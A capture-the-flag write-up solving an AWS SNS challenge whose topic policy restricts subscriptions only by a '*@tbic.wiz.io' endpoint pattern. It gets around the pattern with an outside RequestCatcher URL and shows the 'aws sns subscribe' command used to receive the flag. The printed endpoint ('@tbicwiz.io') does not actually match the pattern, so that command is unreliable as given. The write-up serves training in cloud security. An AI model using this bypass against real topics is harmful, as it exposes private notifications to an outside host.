# Challenge number 
3

## Challenge Statement
Enable Push Notifications: We got a message for you. Can you get it?

## IAM Policy
```json
{
    "Version": "2008-10-17",
    "Id": "Statement1",
    "Statement": [
        {
            "Sid": "Statement1",
            "Effect": "Allow",
            "Principal": {
                "AWS": "*"
            },
            "Action": "SNS:Subscribe",
            "Resource": "arn:aws:sns:us-east-1:092297851374:TBICWizPushNotifications",
            "Condition": {
                "StringLike": {
                    "sns:Endpoint": "*@tbic.wiz.io"
                }
            }
        }
    ]
}
```
### write a short analysis about the IAM policy here
```
* What do I have access to?
I have access to subscribe an HTTPS endpoint to the SNS topic TBICWizPushNotifications and receive notifications sent to the topic.

* What don't I have access to?
I cannot modify the SNS topic, publish messages to the topic, or access other AWS resources or internal logs related to the topic.

* What do I find interesting?
The most interesting part was using the sns:Endpoint condition to restrict subscriptions to a specific domain (@tbic.wiz.io) and confirming the subscription through an HTTPS endpoint. I also found that the flag might be hidden in one of the messages sent to the topic.
```

## Solution
Detailed steps to the flag

Step 1: Review IAM Policy-
The IAM policy allowed me to subscribe to the SNS topic TBICWizPushNotifications using an HTTPS endpoint with the domain @tbic.wiz.io.

Step 2: Prepare Subscription Endpoint
I used RequestCatcher to create an endpoint that matched the policy condition:
https://test.requestcatcher.com/test@tbicwiz.io

Step 3: Subscribe to the SNS Topic
I ran the following AWS CLI command to subscribe the endpoint to the SNS topic:
aws sns subscribe \
    --topic-arn arn:aws:sns:us-east-1:092297851374:TBICWizPushNotifications \
    --protocol https \
    --notification-endpoint 'https://test.requestcatcher.com/test@tbicwiz.io'

Step 4: Confirm Subscription
SNS sent a confirmation request to the endpoint, which I accepted through RequestCatcher to complete the subscription.

Step 5: Receive and Analyze Messages
Once confirmed, I received messages at the endpoint. One of the messages contained the flag, which I identified by analyzing the payload.


## Reflection
* What was your approach?
I reviewed the IAM policy, subscribed to the SNS topic using an HTTPS endpoint, confirmed the subscription, and analyzed the messages for the flag.

* What was the biggest challenge?
The biggest challenge was ensuring the subscription was confirmed correctly and receiving messages from the SNS topic.

* How did you overcome the challenges?
I used RequestCatcher to confirm the subscription and monitor incoming messages.

* What led to the break through?
Successfully confirming the subscription and receiving the messages at the endpoint helped me locate the flag.

* On the blue side, how can the learning be used to properly defend the important assets? 
By using IAM policies to tightly control access to resources like SNS topics, we can restrict subscriptions to trusted endpoints and prevent unauthorized access.